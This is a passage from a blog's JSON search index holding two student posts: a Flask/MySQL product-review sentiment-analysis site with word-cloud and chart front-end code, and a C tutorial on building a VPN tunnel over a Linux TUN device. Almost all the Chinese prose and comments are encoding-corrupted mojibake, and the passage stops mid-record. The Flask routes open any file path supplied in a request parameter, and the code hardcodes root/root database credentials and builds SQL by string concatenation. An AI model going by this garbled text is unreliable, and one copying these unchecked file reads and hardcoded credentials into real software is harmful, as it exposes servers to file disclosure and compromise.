&quot;http://127.0.0.1:5000/loginByPassword&quot;, data: JSON.stringify(obj.field), dataType: &#x27;json&#x27;, success: function (data) &#123; if (data.code == &#x27;200&#x27;) &#123; layer.msg(&#x27;ç™»å½•æˆåŠŸ&#x27;, &#123; icon: 1, time: 1500 &#125;, function () &#123; location.replace(&#x27;../../index.html&#x27;) //é‡å®šå‘åˆ°index.html &#125;) &#125; else &#123; layer.alert(data.msg, &#123;icon: 2&#125;, function (index) &#123; layer.close(index); &#125;); &#125; &#125; &#125;) return false; &#125;); è¯äº‘å±•ç¤ºä½¿ç”¨echartsç”Ÿæˆè¯äº‘ @app.route(&#x27;/top&#x27;,methods=[&#x27;GET&#x27;]) def top(): jsondata = &#123;&#125; if(len(request.args)!=0): if(request.args[&#x27;category&#x27;]==&#x27;good&#x27;): jsondata[&#x27;data&#x27;] = good_datas else: jsondata[&#x27;data&#x27;] = bad_datas else: jsondata[&#x27;data&#x27;] = all_datas j = jsonify(jsondata) print(j) return j æ•°æ®è·å– cursor.execute(&quot;select comment from `comment`&quot;); data_dict = [] result = cursor.fetchall() for field in result: data_dict.append(field[&#x27;comment&#x27;]) content = &#x27;&#x27;.join(data_dict) all_datas = [] jieba.analyse.set_stop_words(&#x27;./stopwords.txt&#x27;) tags = jieba.analyse.extract_tags(content, topK=100, withWeight=True) for v, n in tags: mydict = &#123;&#125; mydict[&quot;name&quot;] = v mydict[&quot;value&quot;] = str(int(n * 10000)) all_datas.append(mydict) cursor.close() jsè„šæœ¬ function init() &#123; form.render(); $.ajax(&#123; type: &#x27;GET&#x27;, url: &#x27;http://127.0.0.1:5000/top&#x27;, beforeSend: function(XMLHttpRequest) &#123; //æ³¨æ„ï¼Œlayer.msgé»˜è®¤3ç§’è‡ªåŠ¨å…³é—­ï¼Œå¦‚æœæ•°æ®åŠ è½½è€—æ—¶æ¯”è¾ƒé•¿ï¼Œéœ€è¦è®¾ç½®time loadingFlag = layer.msg(&#x27;æ­£åœ¨è¯»å–æ•°æ®ï¼Œè¯·ç¨å€™â€¦â€¦&#x27;, &#123; icon: 16, shade: 0.01, shadeClose: false, time: 60000 &#125;); &#125;, success: function(res) &#123; console.log(&#x27;åˆå§‹åŒ–&#x27;) layer.close(loadingFlag); myCharts2.setOption(&#123; tooltip: &#123; show: true &#125;, series: [&#123; type: &quot;wordCloud&quot;, gridSize: 6, shape: &#x27;diamond&#x27;, sizeRange: [12, 50], width: 800, height: 500, textStyle: &#123; normal: &#123; color: function() &#123; return &#x27;rgb(&#x27; + [ Math.round(Math.random() * 160), Math.round(Math.random() * 160), Math.round(Math.random() * 160) ].join(&#x27;,&#x27;) + &#x27;)&#x27;; &#125; &#125;, emphasis: &#123; shadowBlur: 10, shadowColor: &#x27;#333&#x27; &#125; &#125;, data: res.data, &#125;] &#125;); è¯„è®ºæ£€æµ‹å½“ç”¨æˆ·è¾“å…¥æ£€æµ‹æ–‡æœ¬ï¼Œç³»ç»Ÿä¼šè°ƒç”¨è®­ç»ƒå¥½çš„æ¨¡å‹å¯¹æ–‡æœ¬è¿›è¡Œæƒ…æ„Ÿåˆ†æï¼Œå¹¶å°†å¾—åˆ°çš„ç»“æœå†™å…¥æ•°æ®åº“ï¼Œä¹‹ååœ¨é¡µé¢ä¸­æ˜¾ç¤º pythonä»£ç  @app.route(&#x27;/data1&#x27;,methods=[&#x27;GET&#x27;]) def data1(): path = str(request.args[&#x27;path&#x27;]) data = [] if(len(path)==0): table_result = &#123;&quot;code&quot;: 0, &quot;msg&quot;: None, &quot;count&quot;: 0, &quot;data&quot;: data&#125; else: with open(path, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f: reader = f.readlines() rows = [row for row in reader] for i in rows: result = analyzer.analyze(i) // è°ƒç”¨å·²ç»å°è£…å¥½çš„æ¨¡å‹å¯¹æäº¤çš„æ–‡æœ¬è¿›è¡Œæ£€æµ‹ï¼Œè¿”å›ç»“æœ d = &#123;&quot;content&quot;:i,&quot;result&quot;:result&#125; data.append(d) table_result = &#123;&quot;code&quot;: 0, &quot;msg&quot;: None, &quot;count&quot;: 10, &quot;data&quot;: data&#125; return jsonify(table_result) @app.route(&#x27;/ksh&#x27;,methods=[&#x27;GET&#x27;]) def ksh(): path = str(request.args[&#x27;path&#x27;]) good = 0 bad = 0 if(len(path)==0): table_result = &#123;&quot;code&quot;: 0, &quot;msg&quot;: None, &quot;count&quot;: 0, &quot;data&quot;: data&#125; else: with open(path, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f: reader = f.readlines() rows = [row for row in reader] for i in rows: result = analyzer.analyze(i) if(result == &quot;å¥½è¯„&quot;): good+=1 else: bad+=1 table_result = &#123;&quot;good&quot;: good, &quot;bad&quot;: bad&#125; return jsonify(table_result) jsè„šæœ¬ var insTb = table.render(&#123; elem: &#x27;#tableUser&#x27;, url: &#x27;http://127.0.0.1:5000/data&#x27;, height: &#x27;full-250&#x27;, page: true, toolbar: true, cellMinWidth: 100, cols: [ [&#123; type: &#x27;numbers&#x27;, title: &#x27;#&#x27; &#125;, &#123; field: &#x27;content&#x27;, sort: true, title: &#x27;å†…å®¹&#x27; &#125;, &#123; field: &#x27;type&#x27;, sort: true, title: &#x27;åˆ†ç±»&#x27;, width:200, templet: function(d)&#123; if(d.TYPE == 1)&#123; return &#x27;å¥½è¯„&#x27; &#125;else&#123; return &#x27;å·®è¯„&#x27; &#125; &#125; &#125; ] ] &#125;); æ‰¹é‡æ£€æµ‹æ‰¹é‡æ£€æµ‹æ˜¯å°†å¤šæ¡è¯„è®ºå†™å…¥txtæ–‡ä»¶ä¸­ï¼Œå®ç°ä¸€æ¬¡æ£€æµ‹å¤šæ¡è¯„è®ºï¼Œç„¶åå°†æ•°æ®æ˜¾ç¤ºåœ¨é¡µé¢ä¸­ï¼Œå¹¶å‘ˆç°å¯è§†åŒ–ç»“æœ @app.route(&#x27;/data&#x27;,methods=[&#x27;GET&#x27;]) def data(): limit = int(request.args[&#x27;limit&#x27;]) page = int(request.args[&#x27;page&#x27;]) page = (page-1)*limit conn = pymysql.connect(host=&#x27;127.0.0.1&#x27;, user=&#x27;root&#x27;, password=&#x27;root&#x27;, port=3306, db=&#x27;goods&#x27;, charset=&#x27;utf8mb4&#x27;) cursor = conn.cursor() cursor.execute(&quot;select count(*) from `result`&quot;); count = cursor.fetchall() cursor = conn.cursor(cursor=pymysql.cursors.DictCursor) cursor.execute(&quot;select * from `result` limit &quot;+str(page)+&quot;,&quot;+str(limit)); data_dict = [] result = cursor.fetchall() for field in result: data_dict.append(field) table_result = &#123;&quot;code&quot;: 0, &quot;msg&quot;: None, &quot;count&quot;: count[0], &quot;data&quot;: data_dict&#125; cursor.close() conn.close() return jsonify(table_result) jsè„šæœ¬ upload.render(&#123; //å…è®¸ä¸Šä¼ çš„æ–‡ä»¶åç¼€ elem: &#x27;#test_upload&#x27;, url: &#x27;http://127.0.0.1:5000/upload&#x27;, field: &#x27;myfile&#x27;, accept: &#x27;file&#x27;, //æ™®é€šæ–‡ä»¶ exts: &#x27;txt&#x27;, //åªå…è®¸ä¸Šä¼ txtæ–‡ä»¶ before: function(obj) &#123; //objå‚æ•°åŒ…å«çš„ä¿¡æ¯ï¼Œè·Ÿ chooseå›è°ƒå®Œå…¨ä¸€è‡´ï¼Œå¯å‚è§ä¸Šæ–‡ã€‚ layer.load(); //ä¸Šä¼ loading &#125;, done: function(res) &#123; layer.closeAll(&#x27;loading&#x27;); layer.msg(&#x27;ä¸Šä¼ æˆåŠŸ&#x27;); console.log(res) path = res.path insTb.reload(&#123; where: &#123; &#x27;path&#x27;: path &#125; &#125;); $.ajax(&#123; type: &#x27;GET&#x27;, url: &#x27;http://127.0.0.1:5000/ksh&#x27;, data: &#123; &#x27;path&#x27;: path &#125;, success: function(result) &#123; var option = &#123; tooltip: &#123; trigger: &#x27;item&#x27;, formatter: &#x27;&#123;a&#125; &lt;br/&gt;&#123;b&#125; : &#123;c&#125; (&#123;d&#125;%)&#x27; &#125;, legend: &#123; orient: &#x27;vertical&#x27;, left: &#x27;left&#x27;, data: [&#x27;æœ‰æ•ˆè¯„è®º&#x27;, &#x27;åƒåœ¾è¯„è®º&#x27;] &#125;, series: [&#123; name: &#x27;è¯„è®ºæ¯”ä¾‹&#x27;, type: &#x27;pie&#x27;, radius: &#x27;55%&#x27;, center: [&#x27;50%&#x27;, &#x27;60%&#x27;], data: [&#123; value: result.good, name: &#x27;æœ‰æ•ˆè¯„è®º&#x27; &#125;, &#123; value: result.bad, name: &#x27;åƒåœ¾è¯„è®º&#x27; &#125; ], emphasis: &#123; itemStyle: &#123; shadowBlur: 10, shadowOffsetX: 0, shadowColor: &#x27;rgba(0, 0, 0, 0.5)&#x27; &#125; &#125; &#125;] &#125;; myCharts.setOption(option) &#125; &#125;); æœ€åå‘ˆç°çš„æ•ˆæœ å‚è€ƒï¼š https://github.com/NTDXYG/ProjectsForChineseGraduates","tags":[{"name":"æœ´ç´ è´å¶æ–¯","slug":"æœ´ç´ è´å¶æ–¯","permalink":"https://sunzhengyu99.github.io/tags/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF/"}]},{"title":"VPN","date":"2021-07-21T08:04:57.000Z","path":"2021/07/21/VPN/","text":"æ“ä½œç³»ç»Ÿå¤§ä½œä¸š ä¸€ã€åŸºäºUDP/TCPçš„VPNå®ç°åŸç† tun æ¥å£ VPNæ­å»º éš§é“è½¬å‘æ•°æ®åŒ… tun è®¾å¤‡ç®€ä»‹tun(/tap) æ˜¯ Linux å†…æ ¸ 2.4.x ç‰ˆæœ¬ä¹‹åå®ç°çš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œä¸åŒäºç‰©ç†ç½‘å¡é ç¡¬ä»¶ç½‘å¡å®ç°ï¼Œtap/tun è™šæ‹Ÿç½‘å¡å®Œå…¨ç”±è½¯ä»¶æ¥å®ç°ï¼ŒåŠŸèƒ½å’Œç¡¬ä»¶å®ç°å®Œå…¨æ²¡æœ‰å·®åˆ«ï¼Œå®ƒä»¬éƒ½å±äºç½‘ç»œè®¾å¤‡ï¼Œéƒ½å¯ä»¥é…ç½® IPï¼Œéƒ½å½’ Linux ç½‘ç»œè®¾å¤‡ç®¡ç†æ¨¡å—ç»Ÿä¸€ç®¡ç†ã€‚ TUN å·¥ä½œæœºåˆ¶TUN è®¾å¤‡æ˜¯ä¸€ç§è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œé€šè¿‡æ­¤è®¾å¤‡ï¼Œç¨‹åºå¯ä»¥æ–¹ä¾¿å¾—æ¨¡æ‹Ÿç½‘ç»œè¡Œä¸ºã€‚å…¶å·¥ä½œæ–¹å¼å¦‚å›¾ Linux Tun/Tapé©±åŠ¨ç¨‹åºä¸ºåº”ç”¨ç¨‹åºæä¾›äº†ä¸¤ç§äº¤äº’æ–¹å¼ï¼šè™šæ‹Ÿç½‘ç»œæ¥å£å’Œå­—ç¬¦è®¾å¤‡/dev/net/tunã€‚å†™å…¥å­—ç¬¦è®¾å¤‡/dev/net/tunçš„æ•°æ®ä¼šå‘é€åˆ°è™šæ‹Ÿç½‘ç»œæ¥å£ä¸­ï¼›å‘é€åˆ°è™šæ‹Ÿç½‘ç»œæ¥å£ä¸­çš„æ•°æ®ä¹Ÿä¼šå‡ºç°åœ¨è¯¥å­—ç¬¦è®¾å¤‡ä¸Šã€‚ åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡æ ‡å‡†çš„Socket APIå‘Tun/Tapæ¥å£å‘é€IPæ•°æ®åŒ…ï¼Œå°±å¥½åƒå¯¹ä¸€ä¸ªçœŸå®çš„ç½‘å¡è¿›è¡Œæ“ä½œä¸€æ ·ã€‚é™¤äº†åº”ç”¨ç¨‹åºä»¥å¤–ï¼Œæ“ä½œç³»ç»Ÿä¹Ÿä¼šæ ¹æ®TCP/IPåè®®æ ˆçš„å¤„ç†å‘Tun/Tapæ¥å£å‘é€IPæ•°æ®åŒ…æˆ–è€…ä»¥å¤ªç½‘æ•°æ®åŒ…ï¼Œä¾‹å¦‚ARPæˆ–è€…ICMPæ•°æ®åŒ…ã€‚Tun/Tapé©±åŠ¨ç¨‹åºä¼šå°†Tun/Tapæ¥å£æ”¶åˆ°çš„æ•°æ®åŒ…åŸæ ·å†™å…¥åˆ°/dev/net/tunå­—ç¬¦è®¾å¤‡ä¸Šï¼Œå¤„ç†Tun/Tapæ•°æ®çš„åº”ç”¨ç¨‹åºå¦‚VPNç¨‹åºå¯ä»¥ä»è¯¥è®¾å¤‡ä¸Šè¯»å–åˆ°æ•°æ®åŒ…ï¼Œä»¥è¿›è¡Œç›¸åº”å¤„ç†ã€‚ åº”ç”¨ç¨‹åºä¹Ÿå¯ä»¥é€šè¿‡/dev/net/tunå­—ç¬¦è®¾å¤‡å†™å…¥æ•°æ®åŒ…ï¼Œè¿™ç§æƒ…å†µä¸‹è¯¥å­—ç¬¦è®¾å¤‡ä¸Šå†™å…¥çš„æ•°æ®åŒ…ä¼šè¢«å‘é€åˆ°Tun/Tapè™šæ‹Ÿæ¥å£ä¸Šï¼Œè¿›å…¥æ“ä½œç³»ç»Ÿçš„TCP/IPåè®®æ ˆè¿›è¡Œç›¸åº”å¤„ç†ï¼Œå°±åƒä»ç‰©ç†ç½‘å¡è¿›å…¥æ“ä½œç³»ç»Ÿçš„æ•°æ®ä¸€æ ·ã€‚ æ­å»º VPNå…¶å·¥ä½œæµç¨‹ä¸ºï¼š é€šè¿‡ç¨‹åºå¯ä»¥ä»/dev/net/tunå­—ç¬¦è®¾å¤‡ä¸­è¯»å–(read)æˆ–è€…å†™å…¥(write)æ•°æ®ï¼Œå†é€šè¿‡å°†Tunç»“åˆç‰©ç†ç½‘ç»œè®¾å¤‡ä½¿ç”¨,æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªç‚¹å¯¹ç‚¹çš„éš§é“ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå·¦è¾¹ä¸»æœºä¸Šåº”ç”¨ç¨‹åºå‘é€åˆ°Tunè™šæ‹Ÿè®¾å¤‡ä¸Šçš„IPæ•°æ®åŒ…è¢«VPNç¨‹åºé€šè¿‡å­—ç¬¦è®¾å¤‡æ¥æ”¶ï¼Œç„¶åå†é€šè¿‡ä¸€ä¸ªUDPéš§é“å‘é€åˆ°å³ç«¯çš„VPNæœåŠ¡å™¨ä¸Šï¼ŒVPNæœåŠ¡å™¨å°†éš§é“è´Ÿè½½ä¸­çš„åŸå§‹IPæ•°æ®åŒ…å†™å…¥å­—ç¬¦è®¾å¤‡ï¼Œè¿™äº›IPåŒ…å°±ä¼šå‡ºç°åœ¨å³ä¾§çš„Tunè™šæ‹Ÿè®¾å¤‡ä¸Šï¼Œæœ€åé€šè¿‡æ“ä½œç³»ç»Ÿåè®®æ ˆå’Œsocketæ¥å£å‘é€åˆ°å³ä¾§çš„åº”ç”¨ç¨‹åºä¸Šã€‚ é€šè¿‡éš§é“å‘é€/æ¥æ”¶åŒ… å½“éš§é“å»ºç«‹åï¼Œå¦‚ä½•é€šè¿‡éš§é“å‘é€/æ¥æ”¶æ•°æ®åŒ…æ˜¯éœ€è¦è§£å†³çš„é—®é¢˜ é€šè¿‡éš§é“å‘é€ é€šè¿‡TUNæ¥å£è·å¾—ä¸€ä¸ªIPåŒ…â€”&gt;åŠ å¯†ï¼ˆæˆ–è€…éªŒè¯)â€”&gt;æŠŠå®ƒä½œä¸ºè½½è·å‘é€åˆ°éš§é“å¦ä¸€ç«¯ é€šè¿‡éš§é“æ¥æ”¶ é€šè¿‡éš§é“æ¥æ”¶è½½è·â€”&gt;è§£å¯†å¹¶éªŒè¯æ•°æ®â€”&gt;è·å¾—çœŸå®çš„åŒ…æ•°æ®â€”&gt;æŠŠåŒ…æ•°æ®å†™åˆ°TUNæ¥å£ã€‚ å¦‚ä¸‹å›¾æ‰€ç¤º ç›‘å¬socketå’Œtun0ç½‘å¡ï¼Œç„¶åè½¬å‘æ•°æ®åŒ… æ¯ä¸€ä¸ªéš§é“åº”ç”¨éƒ½æœ‰ä¸¤ç§æ¥å£: socketæ¥å£ã€TUNæ¥å£ï¼Œä¸¤ç§æ¥å£éƒ½éœ€è¦ç›‘å¬ï¼Œéœ€è¦åœ¨ä¸¤ç§æ¥å£é—´è½¬å‘æ•°æ®ã€‚ ç¨‹åºå®ç°åœ¨ç¼–å†™ç¨‹åºä¹‹å‰éœ€è¦åšä¸€äº›å‡†å¤‡ï¼Œç¨‹åºæµç¨‹å›¾å¦‚ä¸‹ ä»å›¾ä¸­å¯çŸ¥ç¨‹åºä¸­ä¸»è¦åŒ…å«å››ä¸ªéƒ¨åˆ† åˆ›å»ºtun0ç½‘å¡ å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨socketè¿æ¥ è½¬å‘æ¥è‡ªtunnelå’Œtun0æ•°æ® ä¸»ç¨‹åºï¼Œç›‘å¬æ¥å£é˜»å¡è¿›ç¨‹ vpnclient å’Œ vpnserver ç¨‹åºæ˜¯ VPN éš§é“çš„ä¸¤ç«¯ã€‚å®ƒä»¬é€šè¿‡å¥—æ¥å­—ä½¿ç”¨ UDP ç›¸äº’é€šä¿¡ã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„è™šçº¿æç»˜äº† VPN éš§é“çš„è·¯å¾„ã€‚ VPN å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç¨‹åºé€šè¿‡ TUN æ¥å£è¿æ¥åˆ°ä¸»æœºç³»ç»Ÿï¼Œé€šè¿‡å®ƒä»–ä»¬åšä¸¤ä»¶äº‹ï¼š ï¼ˆ1ï¼‰ä»ä¸»æœºç³»ç»Ÿè·å– IP æ•°æ®åŒ…ï¼Œå› æ­¤æ•°æ®åŒ…å¯ä»¥é€šè¿‡éš§é“å‘é€ ï¼ˆ2ï¼‰ä»éš§é“è·å– IP æ•°æ®åŒ…ï¼Œç„¶åå°†å…¶è½¬å‘åˆ°æ‰˜ç®¡ç³»ç»Ÿï¼Œè¯¥ç³»ç»Ÿä¼šå°†æ•°æ®åŒ…è½¬å‘åˆ°å…¶æœ€ç»ˆç›®çš„åœ°ã€‚ åˆ›å»ºtunç½‘å¡åœ¨ä¸Šå›¾ä¸­å¯ä»¥çœ‹åˆ°å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½éœ€è¦ä¸€ä¸ªtunç½‘å¡ï¼Œæ‰€ä»¥éœ€è¦åœ¨ä¸¤å°ä¸»æœºä¸Šéƒ½åˆ›å»ºä¸€ä¸ªtun0ç½‘å¡ï¼Œä»è€Œå½¢æˆtunnelï¼Œå®ç°é€šä¿¡ ä½¿ç”¨å‘½ä»¤åˆ›å»ºtunç½‘å¡ ip tuntap add dev tun0 mode tun å½“ä¸Šé¢çš„å‘½ä»¤æ‰§è¡Œå®Œå†ä½¿ç”¨ifconfig -aå°±å¯ä»¥çœ‹åˆ°åˆšåˆšåˆ›å»ºçš„tun0ç½‘å¡ï¼Œå†ä½¿ç”¨å¦‚ä¸‹çš„å‘½ä»¤å¯¹å…¶é…ç½® ifconfig tun0 192.168.53.5/24 up ä½†æ˜¯è¿™é‡Œä¸ºäº†ç¨‹åºæ‰§è¡Œæ–¹ä¾¿ï¼Œç›´æ¥åœ¨ç¨‹åºä¸­åˆ›å»ºè™šæ‹Ÿç½‘å¡ int createTunDevice() &#123; // åˆ›å»º tun0 ç½‘å¡ int tunfd; struct ifreq ifr; memset(&amp;ifr, 0, sizeof(ifr)); ifr.ifr_flags = IFF_TUN | IFF_NO_PI; // tunè®¾å¤‡ä¸åŒ…å«ä»¥å¤ªç½‘å¤´éƒ¨ tunfd = open(&quot;/dev/net/tun&quot;, O_RDWR); // æ‰“å¼€æ–‡ä»¶ ioctl(tunfd, TUNSETIFF, &amp;ifr); // æ‰“å¼€è®¾å¤‡ return tunfd; // è¯¥å‡½æ•°æ‰§è¡Œå®Œå æ‰§è¡Œå‘½ä»¤ifconfig tunX 192.168.53.5/24 up ä¸ºtunç½‘å¡è®¾ç½®IPå¹¶å¼€å¯ &#125; socketè¿æ¥VPN server UDPè¿æ¥int initUDPServer() &#123; int sockfd; struct sockaddr_in server; char buff[100]; memset(&amp;server, 0, sizeof(server)); server.sin_family = AF_INET; // æœåŠ¡å™¨åœ°å€ç±»å‹ä¸ºIPV4 server.sin_addr.s_addr = htonl(INADDR_ANY); //æœåŠ¡å™¨IP server.sin_port = htons(PORT_NUMBER); // ç«¯å£å· sockfd = socket(AF_INET, SOCK_DGRAM, 0); //åˆ›å»ºUDPçš„å¥—æ¥å­— bind(sockfd, (struct sockaddr*) &amp;server, sizeof(server)); // socketç»‘å®šåœ°å€å’Œç«¯å£ // ç­‰å¾…è¿æ¥ bzero(buff, 100); //æ¸…ç©ºç¼“å†²åŒº int peerAddrLen = sizeof(struct sockaddr_in); //åˆå§‹åŒ–ç»“æ„ä½“ int len = recvfrom(sockfd, buff, 100, 0,(struct sockaddr *) &amp;peerAddr, &amp;peerAddrLen); // ç­‰å¾…æ¥æ”¶æ•°æ® printf(&quot;Connected with the client: %s\\n&quot;, buff); return sockfd; &#125; VPN client int connectToUDPServer()&#123; //åˆ›å»ºsocketè¿æ¥ è¿æ¥åˆ°vpnæœåŠ¡å™¨ int sockfd; char *hello=&quot;Hello&quot;; //æŒ‡å®šæœåŠ¡å™¨çš„åœ°å€ç»“æ„ memset(&amp;peerAddr, 0, sizeof(peerAddr)); peerAddr.sin_family = AF_INET; // æœåŠ¡å™¨åœ°å€ç±»å‹ä¸ºIPV4 peerAddr.sin_port = htons(PORT_NUMBER); peerAddr.sin_addr.s_addr = inet_addr(SERVER_IP); sockfd = socket(AF_INET, SOCK_DGRAM, 0); sendto(sockfd, hello, strlen(hello), 0, // è¿æ¥æœåŠ¡å™¨åå‘é€ä¸€ä¸ªæ¶ˆæ¯ hello (struct sockaddr *) &amp;peerAddr, sizeof(peerAddr)); return sockfd; &#125; TCPè¿æ¥VPN server int initTCPServer() &#123; struct sockaddr_in sa_server; int listen_sock; listen_sock= socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); CHK_ERR(listen_sock, &quot;socket&quot;); memset (&amp;sa_server, &#x27;\\0&#x27;, sizeof(sa_server)); sa_server.sin_family = AF_INET; sa_server.sin_addr.s_addr = INADDR_ANY; sa_server.sin_port = htons (4433); int err = bind(listen_sock, (struct sockaddr*)&amp;sa_server, sizeof(sa_server)); CHK_ERR(err, &quot;bind&quot;); err = listen(listen_sock, 5); CHK_ERR(err, &quot;listen&quot;); return listen_sock; &#125; VPN client int initTCPClient(const char* hostname, int port) &#123; struct sockaddr_in server_addr; struct hostent* hp = gethostbyname(hostname); // åˆ›å»ºTCP socket int sockfd= socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // å¡«å†™ip ç«¯å£ å’Œåè®®ä¿¡æ¯ memset (&amp;server_addr, &#x27;\\0&#x27;, sizeof(server_addr)); memcpy(&amp;(server_addr.sin_addr.s_addr), hp-&gt;h_addr, hp-&gt;h_length); server_addr.sin_port = htons (port); server_addr.sin_family = AF_INET; // è¿æ¥ç›®çš„åœ°å€ connect(sockfd, (struct sockaddr*) &amp;server_addr, sizeof(server_addr)); return sockfd; &#125; è½¬å‘ç«¯å£æ•°æ®å®¢æˆ·ç«¯ç¨‹åºå’ŒæœåŠ¡å™¨ç«¯ç¨‹åºéƒ½éœ€è¦ä»¥ä¸‹ä¸¤ä¸ªåº“å‡½æ•° int sendto(int s, const void * msg, int len, unsigned int flags, const struct sockaddr * to, int tolen); å‡½æ•°è¯´æ˜ï¼šsendto() ç”¨æ¥å°†æ•°æ®ç”±æŒ‡å®šçš„socket ä¼ ç»™å¯¹æ–¹ä¸»æœº. å‚æ•°s ä¸ºå·²å»ºå¥½è¿çº¿çš„socket, å¦‚æœåˆ©ç”¨UDPåè®®åˆ™ä¸éœ€ç»è¿‡è¿çº¿æ“ä½œ. å‚æ•°msg æŒ‡å‘æ¬²è¿çº¿çš„æ•°æ®å†…å®¹, å‚æ•°flags ä¸€èˆ¬è®¾0, å‚æ•°to ç”¨æ¥æŒ‡å®šæ¬²ä¼ é€çš„ç½‘ç»œåœ°å€, ç»“æ„sockaddr è¯·å‚è€ƒbind(). å‚æ•°tolen ä¸ºsockaddr çš„ç»“æœé•¿åº¦. int recvfrom(int s, void *buf, int len, unsigned int flags, struct sockaddr *from,int *fromlen); å‡½æ•°è¯´æ˜ï¼šrecv()ç”¨æ¥æ¥æ”¶è¿œç¨‹ä¸»æœºç»æŒ‡å®šçš„socket ä¼ æ¥çš„æ•°æ®, å¹¶æŠŠæ•°æ®å­˜åˆ°ç”±å‚æ•°buf æŒ‡å‘çš„å†…å­˜ç©ºé—´, å‚æ•°len ä¸ºå¯æ¥æ”¶æ•°æ®çš„æœ€å¤§é•¿åº¦. å‚æ•°flags ä¸€èˆ¬è®¾0, å‚æ•°from ç”¨æ¥æŒ‡å®šæ¬²ä¼ é€çš„ç½‘ç»œåœ°å€, ç»“æ„sockaddr è¯·å‚è€ƒbind(). å‚æ•°fromlen ä¸ºsockaddr çš„ç»“æ„é•¿åº¦. ä»tun0æ¥æ”¶æ•°æ®è½¬å‘åˆ°tunnel void tunSelected(int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; //å®šä¹‰æ¥æ”¶æ•°çš„ç¼“å†²åŒº printf(&quot;Got a packet from TUN\\n&quot;); bzero(buff, BUFF_SIZE); // æ¸…ç©ºç¼“å†²åŒº len = read(tunfd, buff, BUFF_SIZE); // è¯»å–æ¥è‡ªtun0ç½‘å¡çš„æ•°æ®ï¼Œä¿å­˜åœ¨ç¼“å†²åŒºä¸­ sendto(sockfd, buff, len, 0, (struct sockaddr *) &amp;peerAddr, sizeof(peerAddr)); // é€šè¿‡socketå‘é€æ•°æ® &#125; ä»tunnelæ¥æ”¶æ•°æ®è½¬å‘åˆ°tun0 void socketSelected (int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; printf(&quot;Got a packet from the tunnel\\n&quot;); bzero(buff, BUFF_SIZE); len = recvfrom(sockfd, buff, BUFF_SIZE, 0, NULL, NULL); // æ¥æ”¶æ•°æ®è‡³buffï¼Œä¿å­˜æ•°æ®çš„é•¿åº¦ write(tunfd, buff, len); // é€šè¿‡writeå‘é€åˆ°tun0 &#125; ä¸»å‡½æ•°ä¸»è¦ä½œç”¨ï¼Œè°ƒç”¨ä¹‹å‰çš„å‡½æ•°ï¼Œåˆ›å»ºtun0ç½‘å¡ï¼›å»ºç«‹åŸºäºudpçš„socketè¿æ¥ï¼›å¾ªç¯æ¥æ”¶æ•°æ® ç”¨åˆ°çš„åº“å‡½æ•° int select(int n, fd_set * readfds, fd_set * writefds, fd_set * exceptfds, struct timeval * timeout); å‡½æ•°è¯´æ˜ï¼šselect()ç”¨æ¥ç­‰å¾…æ–‡ä»¶æè¿°è¯çŠ¶æ€çš„æ”¹å˜ï¼Œä¼šé˜»å¡è¿›ç¨‹. å‚æ•°n ä»£è¡¨æœ€å¤§çš„æ–‡ä»¶æè¿°è¯åŠ 1, å‚æ•°readfdsã€writefds å’Œexceptfds ç§°ä¸ºæè¿°è¯ç»„, æ˜¯ç”¨æ¥å›ä¼ è¯¥æè¿°è¯çš„è¯», å†™æˆ–ä¾‹å¤–çš„çŠ¶å†µ. åº•ä¸‹çš„å®æä¾›äº†å¤„ç†è¿™ä¸‰ç§æè¿°è¯ç»„çš„æ–¹å¼ï¼š FD_CLR(inr fd, fd_set* set); ç”¨æ¥æ¸…é™¤æè¿°è¯ç»„set ä¸­ç›¸å…³fd çš„ä½ FD_ISSET(int fd, fd_set * set); ç”¨æ¥æµ‹è¯•æè¿°è¯ç»„set ä¸­ç›¸å…³fd çš„ä½æ˜¯å¦ä¸ºçœŸ FD_SET(int fd, fd_set* set); ç”¨æ¥è®¾ç½®æè¿°è¯ç»„set ä¸­ç›¸å…³fd çš„ä½ FD_ZERO(fd_set * set); ç”¨æ¥æ¸…é™¤æè¿°è¯ç»„set çš„å…¨éƒ¨ä½ FD_ISSET æ£€æµ‹fdåœ¨fdseté›†åˆä¸­çš„çŠ¶æ€æ˜¯å¦å˜åŒ–ï¼Œå½“æ£€æµ‹åˆ°fdçŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶è¿”å›çœŸï¼Œå¦åˆ™ï¼Œè¿”å›å‡ï¼ˆä¹Ÿå¯ä»¥è®¤ä¸ºé›†åˆä¸­æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦æ˜¯å¦å¯ä»¥è¯»å†™ï¼‰ã€‚ fd_set å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªé›†åˆï¼Œè¿™ä¸ªé›†åˆä¸­å­˜æ”¾çš„æ˜¯æ–‡ä»¶æè¿°ç¬¦(file descriptor)ï¼Œå³æ–‡ä»¶å¥æŸ„ï¼Œå®ƒç”¨ä¸€ä½æ¥è¡¨ç¤ºä¸€ä¸ªfdï¼ˆä¸‹é¢ä¼šä»”ç»†ä»‹ç»ï¼‰ int main (int argc, char * argv[]) &#123; int tunfd, sockfd; tunfd = createTunDevice(); // åˆ›å»ºtun0ç½‘å¡ sockfd = connectToUDPServer(); // å»ºç«‹socketè¿æ¥ // è¿›å…¥ä¸»å¾ªç¯ while (1) &#123; fd_set readFDSet; FD_ZERO(&amp;readFDSet); // å°†setæ¸…é›¶ä½¿é›†åˆä¸­ä¸å«ä»»ä½•fd FD_SET(sockfd, &amp;readFDSet); // å°†socketfdåŠ å…¥seté›†åˆ FD_SET(tunfd, &amp;readFDSet); // å°†tunfdåŠ å…¥seté›†åˆ select(FD_SETSIZE, 